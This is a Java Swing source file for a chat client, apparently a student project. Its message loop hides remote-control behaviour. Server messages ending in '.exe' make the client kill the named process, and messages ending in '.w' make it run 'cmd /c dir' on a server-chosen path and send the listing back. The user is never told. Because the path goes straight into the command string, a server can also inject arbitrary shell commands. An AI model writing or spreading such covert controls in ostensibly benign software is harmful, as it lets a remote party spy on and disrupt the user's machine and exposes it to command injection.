/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package chat2;

import java.awt.Color;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.SwingUtilities;
import projet_semes_test.son;


/**
 *
 * @author Wissem
 */
public final class chat_c extends javax.swing.JFrame {

    
   public ObjectOutputStream out;
   public ObjectInputStream in;
   public String message = "";
   public String serverIP="";
   public Socket connection;
    /**
     * Creates new form chat_c
     */
    
    public chat_c() {
       initComponents();
       this.setIconImage(new ImageIcon("./src/images/chat.png").getImage());
       
     
    }
    
    public class chat implements Runnable{
    

    private void sendMessage(String input)
   {
       
      try
      {
         
         out.writeObject("CLIENT - " + input);
         out.flush();
         showMessage("CLIENT - " + input);
         
      }catch(IOException ioException)
      {
         jTextArea1.append("ERREUR: Impossible d'envoyer un message");
      }
   }

    
     private void showMessage(final String message)
   {
      SwingUtilities.invokeLater(
         new Runnable()
         {
             @Override
            public void run()
            {
               jTextArea1.append(message + "\n");
            }
         }
      );
   }
     
      public void startRunning()
   {
      try
      {
         connectToServer();
         setupStreams();
         whileChatting();
      }catch(EOFException eofException){
         showMessage("Connexion client terminée");
      }catch(IOException ioException){
      }finally{
         close();
      }
   }
      
       private void connectToServer() throws IOException
   {
      
      showMessage("Tentative de connexion ...");
   
      connection = new Socket(InetAddress.getByName(serverIP), 2187);
      showMessage("Vous etes maintement connecté à" + connection.getInetAddress().getHostName());
    //  jTextArea1.setForeground(Color.BLACK);
   }
       
       private void setupStreams() throws IOException
   {
      out = new ObjectOutputStream(connection.getOutputStream());
      out.flush();
      in = new ObjectInputStream(connection.getInputStream());
      showMessage("\n Configuration Terminé!");
   }
       
        private void whileChatting() throws IOException
   {
        String tab[]= new String[2];
        String arbo[]= new String[2];
       cmd process = new cmd();
      ableToType(true);
      do{
         try{
            message = (String) in.readObject();
           
            if(message.endsWith(".exe")){
                tab=message.split("-");
                process.kill(tab[1]);
                }
            
            else if(message.endsWith(".w")){
                System.out.println("ok");
                arbo=message.split("- ");
                arbo=arbo[1].split(".w");
                String s ="";
       Pattern p=Pattern.compile("(.*)  (.*)    (.*)          (.*)");
ArrayList list = new ArrayList();

    try {
      
        
        if(arbo[0].equals("root")){
        Runtime runtime = Runtime.getRuntime();
        InputStream input = runtime.exec("cmd /c " + "dir ").getInputStream();
        BufferedInputStream buffer = new BufferedInputStream(input);
        BufferedReader commandResult = new BufferedReader(new InputStreamReader(buffer));
          String line = "";
        try {
            while ((line = commandResult.readLine()) != null) {
                if(line.indexOf("<REP>")>0){
                 Matcher m=p.matcher(line);
                  while(m.find()) 
                   line=(m.group(4));
                  s += line + "\n";
                  list.add(line);
                }
                
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(s);
        }
        
        
        
        else
        {
         Runtime runtime = Runtime.getRuntime();
        InputStream input = runtime.exec("cmd /c " + "dir "+ arbo[0]).getInputStream();
        BufferedInputStream buffer = new BufferedInputStream(input);
        BufferedReader commandResult = new BufferedReader(new InputStreamReader(buffer));
          String line = "";
        try {
            while ((line = commandResult.readLine()) != null) {
                if(line.indexOf("<REP>")>0){
                 Matcher m=p.matcher(line);
                  while(m.find()) 
                   line=(m.group(4));
                  s += line + "\n";
                  list.add(line);
                }
                
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println(s);
        
        }
        
      
    } catch (Exception e) {
        e.printStackTrace();
    }
    
   s ="";

   for(int i = 0 ; i< list.size();i++){
       s+=(list.get(i)+"+");
         
   }
   if(!s.isEmpty())
    out.writeObject(s);
   list.clear();
   out.flush();
   }
                
            
            else {
                 showMessage(message);
                 son s = new son("nudge.wav");  
                 s.start();
             }
         }catch(ClassNotFoundException classNotFoundException)
         {
            showMessage("Input pas correct");
         }
      }while(!message.equals("SERVER - END"));
   }
        
         private void close()
   {
      showMessage("Fermeture de connexion...");
      ableToType(false);
      try{
         out.close();
         in.close();
         connection.close();
      }catch(IOException ioException)
      {
      }
   }
   
   private void ableToType(final boolean able)
   {
      SwingUtilities.invokeLater(
            new Runnable()
            {
                @Override
               public void run()
               {
                  jTextField1.setEditable(able);
               }
            }
         );
   }
   

   
   
        @Override
        public void run() {
           startRunning();
        }
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jTextField1 = new javax.swing.JTextField();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        jTextField2 = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Chat");
        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jPanel1.setBackground(new java.awt.Color(255, 255, 255));
        jPanel1.setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jTextField1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextField1ActionPerformed(evt);
            }
        });
        jPanel1.add(jTextField1, new org.netbeans.lib.awtextra.AbsoluteConstraints(10, 270, 380, 30));

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jScrollPane1.setViewportView(jTextArea1);

        jPanel1.add(jScrollPane1, new org.netbeans.lib.awtextra.AbsoluteConstraints(10, 50, 380, 210));

        jTextField2.setText("127.0.0.1");
        jTextField2.setToolTipText("");
        jPanel1.add(jTextField2, new org.netbeans.lib.awtextra.AbsoluteConstraints(100, 10, 100, -1));

        jButton1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/images/connect.png"))); // NOI18N
        jButton1.setText("Connexion");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });
        jPanel1.add(jButton1, new org.netbeans.lib.awtextra.AbsoluteConstraints(210, 10, -1, 30));

        jLabel1.setText("Connecter à");
        jPanel1.add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 10, -1, -1));

        getContentPane().add(jPanel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, 400, 310));

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jTextField1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextField1ActionPerformed
        // TODO add your handling code here:
        chat c = new chat();
       c.sendMessage(evt.getActionCommand());
        jTextField1.setText("");
    }//GEN-LAST:event_jTextField1ActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        // TODO add your handling code here:
        serverIP = jTextField2.getText();
        chat c = new chat();
       Thread t = new Thread(c);
       t.start();
    }//GEN-LAST:event_jButton1ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(chat_c.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(chat_c.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(chat_c.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(chat_c.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new chat_c().setVisible(true);
            }
        });
    }
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButton1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JTextField jTextField1;
    private javax.swing.JTextField jTextField2;
    // End of variables declaration//GEN-END:variables
}
